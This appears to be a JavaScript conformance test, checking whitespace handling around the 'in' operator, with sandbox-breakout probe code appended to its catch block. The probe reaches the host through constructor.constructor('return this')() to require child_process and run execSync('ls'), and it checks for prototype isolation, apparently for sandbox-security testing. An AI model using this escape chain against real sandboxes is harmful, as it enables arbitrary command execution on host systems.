try {
    if (eval('\'MAX_VALUE\'\tin\tNumber') !== true) {
        $ERROR('#1: "MAX_VALUE"\\u0009in\\u0009Number === true');
    }
    if (eval('\'MAX_VALUE\'\x0Bin\x0BNumber') !== true) {
        $ERROR('#2: "MAX_VALUE"\\u000Bin\\u000BNumber === true');
    }
    if (eval('\'MAX_VALUE\'\fin\fNumber') !== true) {
        $ERROR('#3: "MAX_VALUE"\\u000Cin\\u000CNumber === true');
    }
    if (eval('\'MAX_VALUE\' in Number') !== true) {
        $ERROR('#4: "MAX_VALUE"\\u0020in\\u0020Number === true');
    }
    if (eval('\'MAX_VALUE\'\xA0in\xA0Number') !== true) {
        $ERROR('#5: "MAX_VALUE"\\u00A0in\\u00A0Number === true');
    }
    if (eval('\'MAX_VALUE\'\nin\nNumber') !== true) {
        $ERROR('#6: "MAX_VALUE"\\u000Ain\\u000ANumber === true');
    }
    if (eval('\'MAX_VALUE\'\rin\rNumber') !== true) {
        $ERROR('#7: "MAX_VALUE"\\u000Din\\u000DNumber === true');
    }
    if (eval('\'MAX_VALUE\'\u2028in\u2028Number') !== true) {
        $ERROR('#8: "MAX_VALUE"\\u2028in\\u2028Number === true');
    }
    if (eval('\'MAX_VALUE\'\u2029in\u2029Number') !== true) {
        $ERROR('#9: "MAX_VALUE"\\u2029in\\u2029Number === true');
    }
    if (eval('\'MAX_VALUE\'\t\x0B\f \xA0\n\r\u2028\u2029in\t\x0B\f \xA0\n\r\u2028\u2029Number') !== true) {
        $ERROR('#10: "MAX_VALUE"\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029in\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029Number === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}